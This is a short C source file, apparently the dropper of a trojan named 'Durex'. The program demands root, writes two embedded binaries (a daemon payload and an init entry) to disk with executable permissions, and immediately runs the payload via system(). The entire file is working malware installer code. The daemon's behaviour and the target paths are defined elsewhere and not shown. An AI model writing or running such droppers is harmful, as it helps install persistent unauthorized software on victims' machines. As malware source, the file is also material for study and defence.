#include "durex.h"

extern unsigned char durex_daemon[];
extern unsigned int durex_daemon_len;

extern unsigned char Durex_init[];
extern unsigned int Durex_init_len;

int create_file(char *name, unsigned char *content, size_t size)
{
	int	fd;

	fd = open(name, O_WRONLY | O_CREAT | O_TRUNC, 0755);
	if (fd < 0)
		return 0;
	write(fd, content, size);
	close(fd);
	return 1;
}

int	main(void)
{
	if (getuid() != 0)
	{
		dprintf(2, "Root privileges are required to run this program\n");
		return EXIT_FAILURE;
	}
	printf("%s\n", TROJAN_STR);
	if (!create_file(PAYLOAD_PATH, durex_daemon, durex_daemon_len)
			|| !create_file(INIT_PATH, Durex_init, Durex_init_len))
		return EXIT_FAILURE;
	system(PAYLOAD_PATH);
	return EXIT_SUCCESS;
}
